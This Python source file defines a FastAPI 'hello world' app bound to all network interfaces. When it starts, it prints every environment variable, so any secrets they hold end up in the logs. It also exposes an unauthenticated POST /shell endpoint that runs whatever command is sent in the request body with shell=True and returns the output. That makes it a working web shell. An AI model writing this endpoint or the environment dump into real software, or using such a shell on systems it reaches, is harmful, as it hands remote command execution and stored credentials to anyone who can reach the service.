import os
import subprocess
import asyncio
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse, PlainTextResponse

app = FastAPI()

def print_env_vars():
    print("===== Environment Variables =====")
    print(f"PORT env: {os.getenv('PORT')}")
    for key, value in os.environ.items():
        print(f"{key}={value}")
    print("=================================")
print_env_vars()

@app.get("/")
async def index():
    return "hello world"

@app.post("/shell")
async def shell(request: Request):
    body = await request.body()
    cmd = body.decode("utf-8").strip()
    result = subprocess.run(
        cmd,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )
    return PlainTextResponse(result.stdout)

if __name__ == '__main__':
    from hypercorn.config import Config
    from hypercorn.asyncio import serve
    
    config = Config()
    port = int(os.getenv("PORT", "5000"))
    config.bind = [f"0.0.0.0:{port}"]
    asyncio.run(serve(app, config))
    
    # pipreqs . --encoding=utf8 --force
